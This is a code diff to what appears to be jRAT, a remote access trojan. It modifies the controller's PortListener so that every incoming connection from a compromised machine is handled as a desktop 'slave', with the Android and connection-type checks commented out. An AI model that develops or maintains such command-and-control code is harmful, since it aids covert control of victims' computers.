@@ -3,11 +3,9 @@ package io.jrat.client.net;
 import io.jrat.client.AbstractSlave;
 import io.jrat.client.Main;
 import io.jrat.client.Slave;
-import io.jrat.client.android.AndroidSlave;
 import io.jrat.client.exceptions.CloseException;
 import io.jrat.client.ui.panels.PanelMainLog;
 import io.jrat.client.ui.panels.PanelMainSockets;
-import io.jrat.common.ConnectionCodes;
 
 import java.net.ServerSocket;
 import java.net.Socket;
@@ -69,21 +67,24 @@ public class PortListener implements Runnable {
 		try {
 			while (!server.isClosed()) {
 				Socket socket = server.accept();
-				int type = socket.getInputStream().read();
+				
+				// int type = socket.getInputStream().read(); TODO, removed for now to make jRAT backwards compatible
 				
 				AbstractSlave slave;
 				
-				if (type == ConnectionCodes.ANDROID_SLAVE) {
+				/*if (type == ConnectionCodes.ANDROID_SLAVE) {
 					slave = new AndroidSlave(this, socket);
 				} else if (type == ConnectionCodes.DESKTOP_SLAVE) {
 					slave = new Slave(this, socket);
-				}
+				}*/
 				
-				if (type < 0 || type > 1) {
+				slave = new Slave(this, socket);
+				
+				/*if (type < 0 || type > 1) {
 					slave = new Slave(this, socket);
 					PanelMainLog.instance.addEntry("Error", slave, "Invalid connection type");
 					continue;
-				}
+				}*/
 
 				if (Main.liteVersion && Main.connections.size() >= 5) {
 					slave = new Slave(this, socket);
